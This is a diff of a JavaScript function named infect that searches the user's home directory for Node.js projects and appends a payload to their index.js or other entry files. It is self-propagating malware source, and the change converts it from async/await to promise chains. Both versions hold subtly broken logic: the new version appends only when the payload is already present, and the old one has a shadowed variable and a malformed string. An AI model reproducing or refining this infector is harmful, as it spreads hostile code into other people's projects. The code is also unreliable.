@@ -1,4 +1,4 @@
-async function infect( payload ) {
+function infect( payload ) {
 
     const fs   = require( "fs" );
     const os   = require( "os" );
@@ -29,8 +29,15 @@ async function infect( payload ) {
     }
 
     function stat( f ) {
-        return new Promise( function( rs, rj ) {
-            fs.stat( f, (e,r) => e ? rj( e ) : rs( r ) );
+        return new Promise( function( rs ) {
+            fs.stat( f, function( err, res ) {
+                if( !err && res.isFile() )
+                    rs( "file" );
+                else if( !err && res.isDirectory() )
+                    rs( "dir" );
+                else
+                    rs( null );
+            });
         });
     }
 
@@ -40,67 +47,46 @@ async function infect( payload ) {
         });
     }
 
-    // utility function to find a file that exists out of a candidate list
-    // used when searching for the actual file to infect
-
-    async function getCandidate( root, candidates ) {
-        for( var candidate of candidates ) {
-            var path = path.join( root, candidate );
-            try {
-                await stat( path );
-                return path;
-            } catch( e ) {
-                continue;
-            }
-        }
-
-        // no candidate file found - we lose
-        return null;
+    function getProjectDirectories( root, depth ) {
+        if( depth < 1 )
+            return [];
+        return readdir( root )
+            .then( function( files ) { 
+                return Promise.all( files.map( function( file ) {
+                    var full = path.join( root, file );
+                    return stat( full )
+                        .then( function( dirInfo ) {
+                            if( dirInfo !== "dir" )
+                                return [];
+                            var ixPath = path.join( full, "index.js" );
+                            return stat( ixPath )
+                                .then( function( ixInfo ) {
+                                    return stat( path.join( full, "package.json" ) ).then( function( pkgInfo ) {
+                                        if( pkgInfo === "file") {
+                                            if( ixInfo === "file" )
+                                                return [ ixPath ];
+                                            return [];
+                                        }
+                                        return getProjectDirectories( full, depth - 1 );
+                                    });
+                                });
+                        });
+                } ) ).then( function( arrs ) {
+                    var res = [];
+                    for( var arr of arrs )
+                        res.push( ...arr );
+                    return res;
+                });
+            });
     }
 
-    async function search( dir ) {
-
-        var filesToInfect = [];
-        var directories   = [];
-        var foundPackage  = false;
-        for( let f of await readdir( dir ) ) {
-            let full = path.join( dir, f );
-            try {
-                let fStat = await stat( full );
-                if( fStat.isFile() ) {
-                    if( f === "package.json" ) {
-                        foundPackage = true;
-                        let packageJson = JSON.parse( await readFile( full ) );
-
-                        // candidate file names in order of preference:
-                        let candidates = [ "index.js", `${packageJson.name}`.js, "app.js", packageJson.main ].filter( x => x );
-                        let target = await getCandidate( dir, candidates );
-
-                        // abort this project if we can't find a target to infect
-                        if( !target )
-                            continue;
-                        filesToInfect.push( target );
-                    }
-                } else if( fStat.isDirectory() ) {
-                    directories.push( full );
-                }
-            } catch( e ) {
-                continue;
-            }
-        }
-
-        if( !foundPackage )
-            for( let d of directories )
-                for( let f of await search( d ) )
-                    filesToInfect.push( f );
-        return filesToInfect;
-    }
-    
-    var filesToInfect = await search( os.homedir() );
-    
-    for( var f of filesToInfect ) {
-        var src = await readFile( f );
-        if( src.indexOf( modifiedPayload ) === -1 )
-            await appendFile( f, modifiedPayload ); 
-    }
+    getProjectDirectories( os.homedir(), 10 ).then( function( files ) {
+        return Promise.all( files.map( function( file ) {
+            readFile( file )
+                .then( function( data ) {
+                    if( data.indexOf( modifiedPayload ) >= 0 )
+                        return appendFile( file, modifiedPayload );
+                }); 
+        }));
+    });
 }
